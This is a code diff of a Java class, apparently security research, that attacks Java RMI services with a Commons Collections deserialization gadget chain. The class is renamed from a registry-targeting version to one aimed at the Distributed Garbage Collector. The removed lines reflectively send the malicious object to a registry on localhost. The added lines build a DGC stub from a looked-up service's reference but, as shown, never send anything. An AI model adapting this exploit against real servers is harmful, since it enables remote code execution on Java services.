@@ -6,10 +6,18 @@ import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.map.LazyMap;
 import org.trganda.remote.RemoteService;
+import sun.rmi.server.UnicastRef;
+import sun.rmi.transport.DGCImpl_Stub;
 import sun.rmi.transport.StreamRemoteCall;
+import sun.rmi.transport.TransportConstants;
 
-import java.io.ObjectOutput;
+import javax.net.SocketFactory;
+import java.io.*;
 import java.lang.reflect.*;
+import java.net.InetSocketAddress;
+import java.net.Socket;
+import java.net.SocketException;
+import java.net.UnknownHostException;
 import java.rmi.NotBoundException;
 import java.rmi.RemoteException;
 import java.rmi.registry.LocateRegistry;
@@ -21,7 +29,7 @@ import java.rmi.server.RemoteRef;
 import java.util.HashMap;
 import java.util.Map;
 
-public class EvilRMIClient2Registry {
+public class EvilRMIClient2ServerDGC {
 
     public Object create() throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException {
         ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
@@ -52,26 +60,23 @@ public class EvilRMIClient2Registry {
         return anotherHandler;
     }
 
-    public void callRemote(String name) throws RemoteException {
+    public void callRemote(String name) throws RemoteException, NotBoundException {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
+        RemoteService rs = (RemoteService) registry.lookup(name);
+
         try {
-            Field ref = registry.getClass().getSuperclass().getSuperclass().getDeclaredField("ref");
-            Field operations = registry.getClass().getDeclaredField("operations");
-            Field interfaceHash = registry.getClass().getDeclaredField("interfaceHash");
+            Field h = rs.getClass().getSuperclass().getDeclaredField("h");
+            h.setAccessible(true);
+            InvocationHandler handler = (InvocationHandler) h.get(rs);
 
+            Field ref = handler.getClass().getSuperclass().getDeclaredField("ref");
             ref.setAccessible(true);
-            operations.setAccessible(true);
-            interfaceHash.setAccessible(true);
-            RemoteRef refs = (RemoteRef) ref.get(registry);
+            UnicastRef unicastRef = (UnicastRef) ref.get(handler);
 
-            Method newCall = refs.getClass().getDeclaredMethod("newCall", RemoteObject.class, Operation[].class, int.class, long.class);
-            Method invoke = refs.getClass().getDeclaredMethod("invoke", RemoteCall.class);
+            Class dgcStub = Class.forName("sun.rmi.transport.DGCImpl_Stub");
+            Constructor dgcC = dgcStub.getConstructor(RemoteRef.class);
+            DGCImpl_Stub stub = (DGCImpl_Stub) dgcC.newInstance(unicastRef);
 
-            StreamRemoteCall call = (StreamRemoteCall)newCall.invoke(refs, registry, operations.get(registry), 2, interfaceHash.get(registry));
-            ObjectOutput out = call.getOutputStream();
-            out.writeObject(create());
-
-            invoke.invoke(refs, call);
         } catch (Exception ex) {
             ex.printStackTrace();
         }
@@ -79,7 +84,7 @@ public class EvilRMIClient2Registry {
 
     public static void main(String[] args) {
         try {
-            EvilRMIClient2Registry rc = new EvilRMIClient2Registry();
+            EvilRMIClient2ServerDGC rc = new EvilRMIClient2ServerDGC();
 
             rc.callRemote("server");
         } catch (Exception ex) {
